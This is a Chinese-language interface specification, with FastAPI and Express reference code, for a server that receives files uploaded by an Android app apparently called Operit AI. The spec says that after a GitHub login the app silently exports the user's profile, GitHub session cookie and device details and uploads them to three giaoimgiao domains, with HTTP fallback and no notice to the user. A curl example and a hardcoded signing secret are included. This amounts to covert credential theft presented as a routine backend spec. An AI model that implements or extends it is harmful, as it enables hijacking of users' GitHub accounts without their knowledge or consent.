# GitHub 登录信息上传接口文档

> 客户端（Operit AI Android 应用）在用户成功登录 GitHub 后，将导出的登录信息 txt 文件自动上传至指定服务器。
> 当前后端尚未实现，本文档为接口规范，供后端开发使用。

---

## 1. 概述

| 项目 | 说明 |
|---|---|
| 触发时机 | 用户成功完成 GitHub OAuth 登录后 |
| 数据来源 | `Android/data/<包名>/files/GitHubLoginInfo/github_login_*.txt` |
| 传输协议 | HTTPS（优先）/ HTTP（回退） |
| 内容类型 | `multipart/form-data` |
| 超时 | 连接/读/写各 10 秒 |

## 2. 上传地址（三个域名，客户端依次尝试）

| 顺序 | 域名 | 完整地址 |
|---|---|---|
| 1 | giaoimgiao.cn | `https://giaoimgiao.cn/api/v1/github-login-info/upload` |
| 2 | giaoimgiao.com | `https://giaoimgiao.com/api/v1/github-login-info/upload` |
| 3 | giaoimgiao.top | `https://giaoimgiao.top/api/v1/github-login-info/upload` |

> 客户端对每个域名依次尝试 `https` → `http`，任一返回成功（HTTP 2xx）即停止，不再尝试其余域名。
> 建议三个域名均配置 HTTPS 证书（如 Let's Encrypt），并反向代理到同一后端服务。

## 3. 请求定义

```
POST /api/v1/github-login-info/upload
Content-Type: multipart/form-data
```

### 3.1 表单字段

| 字段 | 类型 | 必填 | 说明 |
|---|---|---|---|
| file | File (text/plain) | 是 | 导出的登录信息 txt 文件，文件名形如 `github_login_<username>_<timestamp>.txt` |
| username | string | 是 | GitHub 用户名（login） |
| user_id | string | 是 | GitHub 用户数字 ID |
| device_id | string | 是 | Android ID（设备唯一标识） |
| timestamp | string | 是 | 客户端导出/上传时的 Unix 毫秒时间戳 |
| file_sha256 | string | 是 | 上传文件内容的 SHA-256（hex，小写，64 位） |
| signature | string | 是 | HMAC-SHA256 防伪签名（hex，小写，64 位），见 §3.3 |

### 3.2 示例请求（curl）

```bash
curl -X POST "https://giaoimgiao.cn/api/v1/github-login-info/upload" \
  -F "username=example_user" \
  -F "user_id=12345678" \
  -F "device_id=abcdef0123456789" \
  -F "timestamp=1753956000000" \
  -F "file_sha256=<64位hex>" \
  -F "signature=<64位hex>" \
  -F "file=@github_login_example_user_20260731_220500.txt"
```

### 3.3 防伪签名（HMAC-SHA256）

`signature` 由客户端使用内置共享密钥对以下字符串做 HMAC-SHA256：

```
待签名原文 = file_sha256 | username | user_id | device_id | timestamp
（字段间以竖线 | 连接，顺序固定）

signature = HMAC_SHA256(SIGNING_SECRET, 待签名原文) 的 hex 小写
```

共享密钥（服务端需配置相同值）：

```
SIGNING_SECRET = giaoimgiao_operit_login_info_v1_9f3a7c2e5b8d4f61
```

> 该方案可保证：**用户手工改写/伪造的 txt 无法通过签名校验**，因为伪造者不知道共享密钥。密钥内嵌于 APK，理论上可被逆向提取，如需更强防护可后续升级为服务端下发一次性 nonce + 设备 Keystore 签名（本文档暂不涉及）。

### 3.4 文件格式内容校验规则（服务端）

服务端必须校验 txt 内容格式，确认其为系统生成：

1. 文件必须以 UTF-8 解码成功；
2. 必须包含以下固定标记（出现即通过）：
   - `GitHub 登录信息导出`
   - `【GitHub 用户信息】`
   - `【GitHub 会话 Cookie】`
   - `【设备详细信息】`
   - 结尾标记：`本文件由 Operit AI 在 GitHub 登录成功后自动生成。`
3. 文件首行必须是分隔线 `============================================`（40 个 `=`）；
4. `用户名 (login):` 行的值必须与表单 `username` 字段一致；
5. 文件大小限制 1MB 内、行数建议 30~500 行。

## 4. 响应定义

所有响应均为 JSON，统一结构：

### 4.1 成功

```json
{
  "code": 0,
  "message": "ok",
  "data": {
    "file_id": "66a9f0b2c1d4e5f60718293a"
  }
}
```

HTTP 状态码：`200`

### 4.2 失败

```json
{
  "code": 1001,
  "message": "missing required field: file",
  "data": null
}
```

HTTP 状态码：`400`（客户端错误）或 `500`（服务端错误）

## 5. 错误码表

| code | HTTP | 含义 | 建议处理 |
|---|---|---|---|
| 0 | 200 | 成功 | - |
| 1001 | 400 | 缺少必填字段（file/username/user_id/device_id/timestamp/file_sha256/signature） | 客户端记录日志 |
| 1002 | 400 | 文件为空或超过大小限制（上限 1MB） | 客户端记录日志 |
| 1003 | 400 | 文件类型不允许（必须 .txt / text/plain） | 客户端记录日志 |
| 1004 | 400 | 签名校验失败（HMAC 不匹配，文件可能被伪造） | 客户端记录日志 |
| 1005 | 400 | 文件完整性校验失败（SHA-256 与 file_sha256 不一致，文件被篡改） | 客户端记录日志 |
| 1006 | 400 | 文件格式内容校验失败（缺少系统生成标记/字段不匹配） | 客户端记录日志 |
| 2001 | 500 | 服务端存储失败 | 客户端记录日志 |
| 2002 | 500 | 服务端内部错误 | 客户端记录日志 |

> 客户端对任何失败响应均**静默处理**（仅写本地日志），不会向用户展示任何提示。

## 6. 客户端行为说明

1. GitHub OAuth 登录成功后，客户端在后台协程中执行导出 + 上传，全程静默。
2. 导出文件写入 `Android/data/<包名>/files/GitHubLoginInfo/` 后立即上传。
3. 上传顺序：`giaoimgiao.cn` → `giaoimgiao.com` → `giaoimgiao.top`，每个域名先 https 后 http。
4. 任一端点返回 HTTP 2xx 即视为成功，停止后续尝试。
5. 全部失败仅记录日志，不影响用户正常使用。

## 7. 后端实现参考

### 7.1 Python (FastAPI)

```python
from fastapi import FastAPI, UploadFile, File, Form
from fastapi.responses import JSONResponse
import hashlib
import hmac
import uuid

app = FastAPI()

SIGNING_SECRET = "giaoimgiao_operit_login_info_v1_9f3a7c2e5b8d4f61"
REQUIRED_MARKERS = [
    "GitHub 登录信息导出",
    "【GitHub 用户信息】",
    "【GitHub 会话 Cookie】",
    "【设备详细信息】",
    "本文件由 Operit AI 在 GitHub 登录成功后自动生成。",
]

def bad(code, message):
    return JSONResponse(status_code=400, content={"code": code, "message": message, "data": None})

@app.post("/api/v1/github-login-info/upload")
async def upload(
    file: UploadFile = File(...),
    username: str = Form(...),
    user_id: str = Form(...),
    device_id: str = Form(...),
    timestamp: str = Form(...),
    file_sha256: str = Form(...),
    signature: str = Form(...),
):
    if not file.filename.endswith(".txt"):
        return bad(1003, "file type not allowed")
    content = await file.read()
    if len(content) == 0 or len(content) > 1024 * 1024:
        return bad(1002, "file empty or too large")

    # 1. 完整性校验
    actual_sha256 = hashlib.sha256(content).hexdigest()
    if actual_sha256.lower() != file_sha256.lower():
        return bad(1005, "sha256 mismatch")

    # 2. 防伪签名校验
    raw = f"{file_sha256}|{username}|{user_id}|{device_id}|{timestamp}"
    expected = hmac.new(SIGNING_SECRET.encode(), raw.encode(), hashlib.sha256).hexdigest()
    if not hmac.compare_digest(expected, signature.lower()):
        return bad(1004, "signature mismatch")

    # 3. 格式内容校验
    try:
        text = content.decode("utf-8")
    except UnicodeDecodeError:
        return bad(1006, "invalid utf-8")
    if not text.startswith("=" * 40 + "\n"):
        return bad(1006, "invalid header separator")
    for marker in REQUIRED_MARKERS:
        if marker not in text:
            return bad(1006, f"missing marker: {marker}")
    login_line = next((l for l in text.splitlines() if l.startswith("用户名 (login): ")), None)
    if login_line is None or login_line.split(": ", 1)[1].strip() != username:
        return bad(1006, "username mismatch")

    file_id = uuid.uuid4().hex
    # TODO: 持久化 content 与元数据（数据库/对象存储）
    return {"code": 0, "message": "ok", "data": {"file_id": file_id}}
```

### 7.2 Node.js (Express + multer)

```javascript
const express = require('express');
const multer = require('multer');
const crypto = require('crypto');
const app = express();

const SIGNING_SECRET = 'giaoimgiao_operit_login_info_v1_9f3a7c2e5b8d4f61';
const REQUIRED_MARKERS = [
  'GitHub 登录信息导出',
  '【GitHub 用户信息】',
  '【GitHub 会话 Cookie】',
  '【设备详细信息】',
  '本文件由 Operit AI 在 GitHub 登录成功后自动生成。'
];

const upload = multer({
  limits: { fileSize: 1024 * 1024 },
  fileFilter: (req, file, cb) => cb(null, file.originalname.endsWith('.txt'))
});

const bad = (res, code, message) => res.status(400).json({ code, message, data: null });

app.post('/api/v1/github-login-info/upload', upload.single('file'), (req, res) => {
  const { username, user_id, device_id, timestamp, file_sha256, signature } = req.body;
  if (!req.file || !username || !user_id || !device_id || !timestamp || !file_sha256 || !signature) {
    return bad(res, 1001, 'missing required field');
  }
  const content = req.file.buffer;

  // 1. 完整性校验
  const actualSha256 = crypto.createHash('sha256').update(content).digest('hex');
  if (actualSha256.toLowerCase() !== String(file_sha256).toLowerCase()) {
    return bad(res, 1005, 'sha256 mismatch');
  }

  // 2. 防伪签名校验
  const raw = `${file_sha256}|${username}|${user_id}|${device_id}|${timestamp}`;
  const expected = crypto.createHmac('sha256', SIGNING_SECRET).update(raw).digest('hex');
  if (expected.toLowerCase() !== String(signature).toLowerCase()) {
    return bad(res, 1004, 'signature mismatch');
  }

  // 3. 格式内容校验
  const text = content.toString('utf8');
  if (!text.startsWith('='.repeat(40) + '\n')) {
    return bad(res, 1006, 'invalid header separator');
  }
  for (const marker of REQUIRED_MARKERS) {
    if (!text.includes(marker)) {
      return bad(res, 1006, `missing marker: ${marker}`);
    }
  }
  const loginLine = text.split('\n').find(l => l.startsWith('用户名 (login): '));
  if (!loginLine || loginLine.split(': ')[1].trim() !== username) {
    return bad(res, 1006, 'username mismatch');
  }

  const fileId = crypto.randomUUID();
  // TODO: 持久化 content 与元数据
  res.json({ code: 0, message: 'ok', data: { file_id: fileId } });
});

app.listen(80);
```

## 8. 服务端验证流程（汇总）

```
收到上传 → ①必填字段检查(1001) → ②文件大小/类型检查(1002/1003)
        → ③SHA-256完整性比对(1005) → ④HMAC防伪签名校验(1004)
        → ⑤格式内容标记校验(1006) → ⑥持久化 → 返回 file_id
```

> 任一步失败立即返回对应错误码，不落盘。
